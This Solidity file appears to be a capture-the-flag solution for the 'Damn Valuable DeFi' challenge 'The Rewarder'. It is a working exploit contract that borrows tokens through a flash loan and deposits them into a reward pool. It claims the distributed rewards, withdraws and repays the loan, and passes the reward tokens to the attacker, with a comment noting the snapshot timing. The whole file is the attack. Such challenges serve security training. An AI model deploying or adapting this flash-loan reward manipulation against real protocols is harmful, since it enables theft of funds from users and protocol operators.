// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import {RewardToken,AccountingToken,TheRewarderPool} from "./TheRewarderPool.sol";

import "@openzeppelin/contracts/utils/Strings.sol";

contract TheRewarderPoolHacker {

    using Strings for uint256;

    TheRewarderPool _theRewarderPoolContract;
    FlashLoanerPool _flashLoanerPoolContract;
    DamnValuableToken _damnValuableTokenContract;
    AccountingToken _accountingTokenContract;
    RewardToken _RewardTokenContract;

    
    constructor(address flashLoanerPoolAddress,address rewarderPoolAddress) {

        _theRewarderPoolContract = TheRewarderPool(rewarderPoolAddress);
        // Get the liquidityToken, accountingToken, rewardToken by rewarderPool
        _damnValuableTokenContract = DamnValuableToken(_theRewarderPoolContract.liquidityToken());
        _accountingTokenContract = AccountingToken(_theRewarderPoolContract.accountingToken());
        _RewardTokenContract = RewardToken(_theRewarderPoolContract.rewardToken());

        _flashLoanerPoolContract = FlashLoanerPool(flashLoanerPoolAddress);
    
    }
   
   function attack(uint256 amount) external {
        // flashloan the liquidityToken  
        _flashLoanerPoolContract.flashLoan(amount);

        // after get rewards, transfer the rewards to player
        _RewardTokenContract.transfer(msg.sender,_RewardTokenContract.balanceOf(address(this)));

   } 

   
   function receiveFlashLoan(uint256 amount) external {

        // deposit borrow token and witdraw, then return all borrowd token   
        _damnValuableTokenContract.approve(address(_theRewarderPoolContract),amount);
        _theRewarderPoolContract.deposit(amount);  // there should consider the snapshot
        _theRewarderPoolContract.withdraw(amount);

        _damnValuableTokenContract.transfer(msg.sender, amount);

   }

}
